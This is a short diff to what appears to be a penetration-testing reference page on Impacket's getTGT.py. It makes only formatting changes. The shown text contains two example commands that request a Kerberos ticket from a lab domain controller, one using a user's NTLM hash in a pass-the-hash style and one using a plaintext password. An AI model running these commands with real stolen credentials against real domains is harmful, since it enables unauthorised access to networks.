@@ -9,12 +9,14 @@ Impacket’s `getTGT.py` uses a valid user’s NTLM hash to request Kerberos tic
 **Command Reference:**
 
 **Command:**
-1. With user's NTLM hashes-
+1. With user's NTLM hashes
+
 ```shell
 python3 getTGT.py lab.lcl/tony -dc-ip 10.10.10.1 -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
 
 ```
 2. With username and password
+
 ```shell
 python3 getTGT.py lab.lcl/tony:'P@$$w0rD' -dc-ip 10.10.10.1
 
